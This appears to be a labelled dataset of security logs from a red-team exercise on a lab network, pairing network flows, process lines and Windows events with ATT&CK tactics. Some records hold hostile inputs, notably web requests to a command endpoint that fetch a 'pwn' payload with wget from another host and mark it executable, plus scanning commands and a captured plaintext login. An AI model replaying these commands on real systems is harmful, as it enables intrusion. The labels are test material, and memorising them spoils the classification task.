ID,Event,Tactic,Technique
2018_T08_025,"{""endtime"":""2018-11-03T15:12:22.434618Z"",""timestamp"":""2018-11-03T15:12:22.430470Z"",""bytes"":4897,""src_mac"":""42:01:0A:00:FE:C9"",""src_port"":47486,""bytes_in"":118,""dest_ip"":""10.0.0.176"",""dest_mac"":""42:01:0A:00:FE:01"",""dest_port"":80,""bytes_out"":4779,""time_taken"":4148,""transport"":""tcp"",""flow_id"":""09a265dc-62e6-4842-a6ab-c072d0f14452"",""src_ip"":""10.0.254.201"",""http_comment"":""HTTP/1.1 200 OK"",""http_content_length"":4539,""http_content_type"":""text/html; charset=utf-8"",""site"":""10.0.0.176"",""http_method"":""GET"",""server"":""nginx/1.14.0 (Ubuntu)"",""status"":200,""uri_path"":""/about"",""http_user_agent"":""Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"",""protocol_stack"":""ip:tcp:http""}",Pre-Attack,Pre-Attack
2018_T08_026,"{""endtime"":""2018-11-03T18:17:22.356616Z"",""timestamp"":""2018-11-03T18:17:22.351317Z"",""bytes"":18439,""src_mac"":""42:01:0A:00:FE:CA"",""src_port"":48074,""bytes_in"":92,""dest_ip"":""10.0.0.176"",""dest_mac"":""42:01:0A:00:FE:01"",""dest_port"":80,""bytes_out"":18347,""time_taken"":5317,""transport"":""tcp"",""flow_id"":""6e8f7417-a645-4dbe-af96-b453082632ac"",""src_ip"":""10.0.254.202"",""http_comment"":""HTTP/1.1 200 OK"",""http_content_length"":18013,""http_content_type"":""application/json; charset=UTF-8"",""site"":""10.0.0.176"",""http_method"":""GET"",""server"":""nginx/1.14.0 (Ubuntu)"",""status"":200,""uri_path"":""/public/apidoc.json"",""http_user_agent"":""curl/7.58.0"",""protocol_stack"":""ip:tcp:http""}",Collection,Data from Information Repositories
2018_T08_027,"{""endtime"":""2018-11-03T18:18:04.386297Z"",""timestamp"":""2018-11-03T18:18:04.383626Z"",""bytes"":589,""src_mac"":""42:01:0A:00:FE:CA"",""src_port"":48082,""bytes_in"":163,""dest_ip"":""10.0.0.176"",""dest_mac"":""42:01:0A:00:FE:01"",""dest_port"":80,""bytes_out"":426,""time_taken"":2714,""transport"":""tcp"",""flow_id"":""7edb32ce-0fce-4b1a-85d7-25ebf4bd5501"",""src_ip"":""10.0.254.202"",""http_comment"":""HTTP/1.1 404 Not Found"",""http_content_length"":146,""http_content_type"":""text/html; charset=utf-8"",""form_data"":""{\""cmd\"": \""ls\""}"",""site"":""10.0.0.176"",""http_method"":""POST"",""server"":""nginx/1.14.0 (Ubuntu)"",""status"":404,""uri_path"":""/cmdlet"",""http_user_agent"":""curl/7.58.0"",""protocol_stack"":""ip:tcp:http""}",Lateral Movement,Exploitation of Remote Services
2018_T08_028,"{""endtime"":""2018-11-03T18:20:27.148516Z"",""timestamp"":""2018-11-03T18:20:27.126301Z"",""bytes"":595,""src_mac"":""42:01:0A:00:FE:CA"",""src_port"":48110,""bytes_in"":176,""dest_ip"":""10.0.0.176"",""dest_mac"":""42:01:0A:00:FE:01"",""dest_port"":80,""bytes_out"":419,""time_taken"":22246,""transport"":""tcp"",""flow_id"":""35edcdc6-5359-46ef-8ca3-95781d024f8e"",""src_ip"":""10.0.254.202"",""http_comment"":""HTTP/1.1 200 OK"",""http_content_length"":175,""http_content_type"":""application/json; charset=utf-8"",""form_data"":""cmd=ls"",""site"":""10.0.0.176"",""http_method"":""GET"",""server"":""nginx/1.14.0 (Ubuntu)"",""status"":200,""uri_query"":""cmd=ls"",""uri_path"":""/api/v1/cmdlet"",""http_user_agent"":""curl/7.58.0"",""protocol_stack"":""ip:tcp:http""}",Lateral Movement,Exploitation of Remote Services
2018_T08_029,"{""endtime"":""2018-11-03T18:31:28.831731Z"",""timestamp"":""2018-11-03T18:31:28.796807Z"",""bytes"":679,""src_mac"":""42:01:0A:00:00:01"",""src_port"":50394,""bytes_in"":409,""dest_ip"":""10.0.0.176"",""dest_mac"":""42:01:0A:00:00:B0"",""dest_port"":80,""bytes_out"":270,""time_taken"":35645,""transport"":""tcp"",""flow_id"":""81eea919-6b8f-4498-b66a-31bced226444"",""src_ip"":""10.0.254.102"",""http_comment"":""HTTP/1.1 200 OK"",""http_content_length"":27,""http_content_type"":""application/json; charset=utf-8"",""form_data"":""cmd=wget%2010.0.254.202:8000/pwn"",""site"":""10.0.0.176"",""http_method"":""GET"",""server"":""nginx/1.14.0 (Ubuntu)"",""status"":200,""uri_query"":""cmd=wget%2010.0.254.202:8000/pwn"",""uri_path"":""/api/v1/cmdlet"",""http_user_agent"":""Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0"",""protocol_stack"":""ip:tcp:http""}",Lateral Movement,Remote File Copy
2018_T08_030,"{""endtime"":""2018-11-03T18:32:24.286913Z"",""timestamp"":""2018-11-03T18:32:24.248311Z"",""bytes"":669,""src_mac"":""42:01:0A:00:00:01"",""src_port"":50394,""bytes_in"":399,""dest_ip"":""10.0.0.176"",""dest_mac"":""42:01:0A:00:00:B0"",""dest_port"":80,""bytes_out"":270,""time_taken"":38602,""transport"":""tcp"",""flow_id"":""81eea919-6b8f-4498-b66a-31bced226444"",""src_ip"":""10.0.254.102"",""http_comment"":""HTTP/1.1 200 OK"",""http_content_length"":27,""http_content_type"":""application/json; charset=utf-8"",""form_data"":""cmd=chmod%20%2Bx%20pwn"",""site"":""10.0.0.176"",""http_method"":""GET"",""server"":""nginx/1.14.0 (Ubuntu)"",""status"":200,""uri_query"":""cmd=chmod%20%2Bx%20pwn"",""uri_path"":""/api/v1/cmdlet"",""http_user_agent"":""Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0"",""protocol_stack"":""ip:tcp:http""}",Execution,File System Permissions Weakness
2018_T09_001,root 15848 1 9.8 00:00:00 0.5 41804 194220 pts/0 S 00:06 masscan -p1-65535_10.0.0.0/24_10.0.1.0/24_--rate_30000_--wait_3,Discovery,Network Service Scanning
2018_T09_002,"{""endtime"":""2018-11-03T14:04:51.528115Z"",""timestamp"":""2018-11-03T14:04:51.528072Z"",""bytes"":108,""src_ip"":""10.0.254.201"",""src_mac"":""42:01:0A:00:00:01"",""src_port"":53705,""connection"":""10.0.0.20:65535"",""client_rtt"":0,""client_rtt_packets"":1,""client_rtt_sum"":0,""ack_packets_in"":0,""bytes_in"":54,""data_packets_in"":0,""duplicate_packets_in"":0,""missing_packets_in"":0,""packets_in"":1,""app"":""unknown"",""server_rtt"":0,""server_rtt_packets"":0,""server_rtt_sum"":0,""refused"":1,""dest_ip"":""10.0.0.20"",""dest_mac"":""42:01:0A:00:00:14"",""dest_port"":65535,""ack_packets_out"":1,""bytes_out"":54,""data_packets_out"":0,""duplicate_packets_out"":0,""missing_packets_out"":0,""packets_out"":1,""tcp_status"":1,""time_taken"":43,""flow_id"":""10b516f4-1688-4143-9730-567ca66b9b22"",""protocol_stack"":""""}",Discovery,Network Service Scanning
2018_T09_003,root 3286 0 0.0 00:00:00 0.0 6556 14844 pts/0 S 00:05 ssh jerrold.reddick@10.0.0.20,"Lateral Movement, Lateral Movement","Valid Accounts, Remote Services"
2018_T09_004,tcp 0 0 10.0.254.202:45120 10.0.0.20:22 ESTAB,"Lateral Movement, Lateral Movement","Valid Accounts, Remote Services"
2018_T09_005,tcp 0 0 10.0.0.20:22 10.0.254.202:45120 ESTAB,"Lateral Movement, Lateral Movement","Valid Accounts, Remote Services"
2018_T09_006,jerrold+ 26309 0 0.2 00:00:00 0.4 33432 789204 pts/0 S 00:18 mongo <noArgs>,"Execution, Lateral Movement, Lateral Movement","Command Line Interface, Valid Accounts, Remote Services"
2018_T09_007,root 15848 1 9.8 00:00:00 0.5 41804 194220 pts/0 S 00:06 masscan -p1-65535_10.0.0.0/24_10.0.1.0/24_--rate_30000_--wait_3,Discovery,Network Service Scanning
2018_T09_008,"{""endtime"":""2018-11-03T14:09:25.166107Z"",""timestamp"":""2018-11-03T14:09:25.166083Z"",""bytes"":108,""src_ip"":""10.0.254.201"",""src_mac"":""42:01:0A:00:01:01"",""src_port"":53705,""connection"":""10.0.1.46:65535"",""client_rtt"":0,""client_rtt_packets"":1,""client_rtt_sum"":0,""ack_packets_in"":0,""bytes_in"":54,""data_packets_in"":0,""duplicate_packets_in"":0,""missing_packets_in"":0,""packets_in"":1,""app"":""unknown"",""server_rtt"":0,""server_rtt_packets"":0,""server_rtt_sum"":0,""refused"":1,""dest_ip"":""10.0.1.46"",""dest_mac"":""42:01:0A:00:01:2E"",""dest_port"":65535,""ack_packets_out"":1,""bytes_out"":54,""data_packets_out"":0,""duplicate_packets_out"":0,""missing_packets_out"":0,""packets_out"":1,""tcp_status"":1,""time_taken"":24,""flow_id"":""f1c8c445-e728-42b3-bca3-da015ec8e099"",""protocol_stack"":""""}",Discovery,Network Service Scanning
2018_T09_009,"{""endtime"":""2018-11-03T15:23:14.012526Z"",""timestamp"":""2018-11-03T15:23:14.007211Z"",""bytes"":1102,""src_mac"":""42:01:0A:00:FE:CC"",""src_port"":45220,""bytes_in"":324,""dest_ip"":""10.0.1.46"",""dest_mac"":""42:01:0A:00:FE:01"",""dest_port"":8082,""bytes_out"":778,""time_taken"":5352,""transport"":""tcp"",""flow_id"":""5644385d-14e0-475c-9a55-fb9662ee6929"",""src_ip"":""10.0.254.204"",""http_comment"":""HTTP/1.1 200 OK"",""http_content_length"":539,""http_content_type"":""text/html"",""site"":""10.0.1.46:8082"",""http_method"":""GET"",""server"":""Jetty(9.4.12.v20180830)"",""status"":200,""uri_path"":""/"",""http_user_agent"":""Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:60.0) Gecko/20100101 Firefox/60.0"",""protocol_stack"":""ip:tcp:http""}",Pre-Attack,Pre-Attack
2018_T09_010,"{""endtime"":""2018-11-03T15:49:19.310208Z"",""timestamp"":""2018-11-03T15:49:19.275476Z"",""bytes"":1270,""src_mac"":""42:01:0A:00:FE:CB"",""src_port"":42680,""bytes_in"":520,""dest_ip"":""10.0.1.46"",""dest_mac"":""42:01:0A:00:FE:01"",""dest_port"":8082,""bytes_out"":750,""time_taken"":34755,""transport"":""tcp"",""flow_id"":""b1388c56-7427-46b0-9c92-bdcf5c22b4de"",""src_ip"":""10.0.254.203"",""http_comment"":""HTTP/1.1 200 OK"",""http_content_length"":398,""http_content_type"":""application/json"",""cookie"":""JSESSIONID=node0wup3qtdlcgea3hn1uj47k9ax1.node0"",""form_data"":""email=nationals-9@wheelzapp.com&password=trojans&undefined=false"",""site"":""10.0.1.46:8082"",""http_method"":""POST"",""http_referrer"":""http://10.0.1.46:8082/"",""server"":""Jetty(9.4.12.v20180830)"",""status"":200,""uri_path"":""/api/session"",""http_user_agent"":""Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:60.0) Gecko/20100101 Firefox/60.0"",""protocol_stack"":""ip:tcp:http""}",Persistence,Create Account
2018_T09_011,root 30907 1 5.9 00:00:01 0.7 56688 72848 pts/0 S 00:22 nmap -p-_-sV_-oG_10.0.0.10_-Pn_-T4_10.0.0.10,Discovery,Network Service Scanning
2018_T09_012,"{""endtime"":""2018-11-03T14:31:42.009095Z"",""timestamp"":""2018-11-03T14:31:42.008472Z"",""bytes"":178,""src_ip"":""10.0.254.203"",""src_mac"":""42:01:0A:00:00:01"",""src_port"":57463,""canceled"":1,""connection"":""10.0.0.10:445"",""client_rtt"":0,""client_rtt_packets"":1,""client_rtt_sum"":0,""ack_packets_in"":0,""bytes_in"":120,""data_packets_in"":0,""duplicate_packets_in"":0,""missing_packets_in"":0,""packets_in"":2,""app"":""unknown"",""server_rtt"":0,""server_rtt_packets"":0,""server_rtt_sum"":0,""dest_ip"":""10.0.0.10"",""dest_mac"":""42:01:0A:00:00:0A"",""dest_port"":445,""ack_packets_out"":1,""bytes_out"":58,""data_packets_out"":0,""duplicate_packets_out"":0,""missing_packets_out"":0,""packets_out"":1,""tcp_status"":0,""time_taken"":623,""flow_id"":""c40e8ac6-c519-489f-820e-c3ab45327a37"",""protocol_stack"":""""}",Discovery,Network Service Scanning
2018_T09_013,root 20047 0 1.3 00:00:00 0.6 50936 67008 pts/3 S 00:26 nmap -sV_-Pn_10.0.0.24,Discovery,Network Service Scanning
2018_T09_014,"{""endtime"":""2018-11-03T14:57:35.376842Z"",""timestamp"":""2018-11-03T14:57:35.376786Z"",""bytes"":112,""src_ip"":""10.0.254.206"",""src_mac"":""42:01:0A:00:00:01"",""src_port"":33993,""connection"":""10.0.0.24:3306"",""client_rtt"":0,""client_rtt_packets"":1,""client_rtt_sum"":0,""ack_packets_in"":0,""bytes_in"":58,""data_packets_in"":0,""duplicate_packets_in"":0,""missing_packets_in"":0,""packets_in"":1,""app"":""unknown"",""server_rtt"":0,""server_rtt_packets"":0,""server_rtt_sum"":0,""refused"":1,""dest_ip"":""10.0.0.24"",""dest_mac"":""42:01:0A:00:00:18"",""dest_port"":3306,""ack_packets_out"":1,""bytes_out"":54,""data_packets_out"":0,""duplicate_packets_out"":0,""missing_packets_out"":0,""packets_out"":1,""tcp_status"":1,""time_taken"":56,""flow_id"":""24ad6d92-1158-45de-8927-7fc93009e580"",""protocol_stack"":""""}",Discovery,Network Service Scanning
2018_T09_015,tcp 0 128 0.0.0.0:27017 0.0.0.0:* LISTEN,Discovery,Network Service Scanning
2018_T09_016,"root 1578 0 7.4 00:00:00 0.6 50632 66932 pts/0 S 00:05 nmap -sV_10.0.0.24_-p80,9000,9300,9200,27017,8514",Discovery,Network Service Scanning
2018_T09_017,"{""endtime"":""2018-11-03T15:19:17.945123Z"",""timestamp"":""2018-11-03T15:19:17.944936Z"",""bytes"":170,""src_ip"":""10.0.254.204"",""src_mac"":""42:01:0A:00:00:01"",""src_port"":48301,""canceled"":1,""connection"":""10.0.0.24:8514"",""client_rtt"":0,""client_rtt_packets"":1,""client_rtt_sum"":0,""ack_packets_in"":0,""bytes_in"":112,""data_packets_in"":0,""duplicate_packets_in"":0,""missing_packets_in"":0,""packets_in"":2,""app"":""unknown"",""server_rtt"":0,""server_rtt_packets"":0,""server_rtt_sum"":0,""dest_ip"":""10.0.0.24"",""dest_mac"":""42:01:0A:00:00:18"",""dest_port"":8514,""ack_packets_out"":1,""bytes_out"":58,""data_packets_out"":0,""duplicate_packets_out"":0,""missing_packets_out"":0,""packets_out"":1,""tcp_status"":0,""time_taken"":187,""flow_id"":""beefff14-21c7-497f-8221-ab394cf6aacd"",""protocol_stack"":""""}",Discovery,Network Service Scanning
2018_T09_018,root 28683 1 29.8 00:00:07 2.7 210424 828264 pts/7 S 00:25 metasploit-framewo /opt/metasploit-framework/bin/../embedded/framework/msfconsole,"Collection, Credential Access","Collection, Credential Access"
2018_T09_019,root 15848 1 9.8 00:00:00 0.5 41804 194220 pts/0 S 00:06 masscan -p1-65535_10.0.0.0/24_10.0.1.0/24_--rate_30000_--wait_3,Discovery,Network Service Scanning
2018_T09_020,"{""endtime"":""2018-11-03T17:54:40.761855Z"",""timestamp"":""2018-11-03T17:54:16.795953Z"",""bytes"":3499,""src_ip"":""10.0.254.105"",""src_mac"":""42:01:0A:00:00:01"",""src_port"":50042,""canceled"":1,""connection"":""10.0.0.10:3389"",""client_rtt"":5894,""client_rtt_packets"":2,""client_rtt_sum"":11789,""ack_packets_in"":3,""bytes_in"":1550,""data_packets_in"":5,""duplicate_packets_in"":0,""missing_packets_in"":0,""packets_in"":9,""app"":""rdp"",""server_rtt"":0,""server_rtt_packets"":0,""server_rtt_sum"":0,""dest_ip"":""10.0.0.10"",""dest_mac"":""42:01:0A:00:00:0A"",""dest_port"":3389,""ack_packets_out"":1,""bytes_out"":1949,""data_packets_out"":5,""duplicate_packets_out"":0,""missing_packets_out"":0,""packets_out"":6,""tcp_status"":0,""time_taken"":23971796,""flow_id"":""80660fa4-b301-4b79-bae1-7c134b50f20a"",""protocol_stack"":""ip:tcp:cotp:ssl:rdp"",""initial_rtt"":621}",Lateral Movement,Remote Desktop Protocol
2018_T09_021,11/03/2018 06:05:59 PM LogName=Security SourceName=Microsoft Windows security auditing. EventCode=5156 EventType=0 Type=Information ComputerName=ad-00.corp.wheelzapp.com TaskCategory=Filtering Platform Connection OpCode=Info RecordNumber=844082 Keywords=Audit Success Message=The Windows Filtering Platform has permitted a connection. Application Information: Process ID: 992 Application Name: \device\harddiskvolume1\windows\system32\svchost.exe Network Information: Direction: Inbound Source Address: 10.0.254.105 Source Port: 64359 Destination Address: 10.0.0.10 Destination Port: 3389 Protocol: 17 Filter Information: Filter Run-Time ID: 67050 Layer Name: Receive/Accept Layer Run-Time ID: 44,Lateral Movement,Remote Desktop Protocol
2018_T09_022,root 15848 1 9.8 00:00:00 0.5 41804 194220 pts/0 S 00:06 masscan -p1-65535_10.0.0.0/24_10.0.1.0/24_--rate_30000_--wait_3,Discovery,Network Service Scanning
2018_T09_023,"{""endtime"":""2018-11-03T17:54:40.761855Z"",""timestamp"":""2018-11-03T17:54:16.795953Z"",""bytes"":3499,""src_ip"":""10.0.254.105"",""src_mac"":""42:01:0A:00:00:01"",""src_port"":50042,""canceled"":1,""connection"":""10.0.0.10:3389"",""client_rtt"":5894,""client_rtt_packets"":2,""client_rtt_sum"":11789,""ack_packets_in"":3,""bytes_in"":1550,""data_packets_in"":5,""duplicate_packets_in"":0,""missing_packets_in"":0,""packets_in"":9,""app"":""rdp"",""server_rtt"":0,""server_rtt_packets"":0,""server_rtt_sum"":0,""dest_ip"":""10.0.0.10"",""dest_mac"":""42:01:0A:00:00:0A"",""dest_port"":3389,""ack_packets_out"":1,""bytes_out"":1949,""data_packets_out"":5,""duplicate_packets_out"":0,""missing_packets_out"":0,""packets_out"":6,""tcp_status"":0,""time_taken"":23971796,""flow_id"":""80660fa4-b301-4b79-bae1-7c134b50f20a"",""protocol_stack"":""ip:tcp:cotp:ssl:rdp"",""initial_rtt"":621}",Lateral Movement,Remote Desktop Protocol
2018_T09_024,11/03/2018 06:05:59 PM LogName=Security SourceName=Microsoft Windows security auditing. EventCode=5156 EventType=0 Type=Information ComputerName=ad-00.corp.wheelzapp.com TaskCategory=Filtering Platform Connection OpCode=Info RecordNumber=844082 Keywords=Audit Success Message=The Windows Filtering Platform has permitted a connection. Application Information: Process ID: 992 Application Name: \device\harddiskvolume1\windows\system32\svchost.exe Network Information: Direction: Inbound Source Address: 10.0.254.105 Source Port: 64359 Destination Address: 10.0.0.10 Destination Port: 3389 Protocol: 17 Filter Information: Filter Run-Time ID: 67050 Layer Name: Receive/Accept Layer Run-Time ID: 44,Lateral Movement,Remote Desktop Protocol
2018_T09_025,root 15848 1 9.8 00:00:00 0.5 41804 194220 pts/0 S 00:06 masscan -p1-65535_10.0.0.0/24_10.0.1.0/24_--rate_30000_--wait_3,Discovery,"Network Service Scanning, Security Software Discovery"
2018_T09_026,"{""endtime"":""2018-11-03T14:16:07.223622Z"",""timestamp"":""2018-11-03T14:16:07.223582Z"",""bytes"":108,""src_ip"":""10.0.254.201"",""src_mac"":""42:01:0A:00:01:01"",""src_port"":53705,""connection"":""10.0.1.40:443"",""client_rtt"":0,""client_rtt_packets"":1,""client_rtt_sum"":0,""ack_packets_in"":0,""bytes_in"":54,""data_packets_in"":0,""duplicate_packets_in"":0,""missing_packets_in"":0,""packets_in"":1,""app"":""unknown"",""server_rtt"":0,""server_rtt_packets"":0,""server_rtt_sum"":0,""refused"":1,""dest_ip"":""10.0.1.40"",""dest_mac"":""42:01:0A:00:01:28"",""dest_port"":443,""ack_packets_out"":1,""bytes_out"":54,""data_packets_out"":0,""duplicate_packets_out"":0,""missing_packets_out"":0,""packets_out"":1,""tcp_status"":1,""time_taken"":40,""flow_id"":""c400ddea-7b30-4957-bba5-dde63e081e83"",""protocol_stack"":""""}",Discovery,"Network Service Scanning, Security Software Discovery"
